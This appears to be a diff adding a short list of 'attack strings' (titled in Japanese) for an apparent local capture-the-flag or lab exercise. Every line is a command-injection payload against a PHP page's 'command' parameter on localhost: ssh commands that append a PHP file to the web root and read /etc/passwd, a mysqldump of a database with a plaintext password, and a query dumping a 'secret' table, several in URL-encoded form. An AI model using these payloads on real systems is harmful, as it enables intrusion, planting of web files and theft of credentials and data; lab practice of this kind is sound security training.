@@ -1,0 +1,12 @@
+攻撃文字列：
+ssh -p 22 ctf-user@localhost "echo '<?php phpinfo(); ?>' >> /var/www/html/sy3/info.php"
+
+ssh -p 22 -t ctf-user@localhost "cat /etc/passwd"
+ssh+-p+22+-t+ctf-user%40localhost+%22cat+%2Fetc%2Fpasswd%22
+
+mysqldump -u User -p12345678 TEST > ./mysqldump.sql
+mysqldump+-u+User+-p12345678+TEST+%3E+%2Fhome%2Futf-user%2Fmysqldump
+
+mysql -u User -p12345678 TEST -e 'select * from secret;'
+
+http://localhost/sy3/index.php?command=mysql+-u+User+-p12345678+TEST+-e+%27select+%2A+from+secret%3B%27
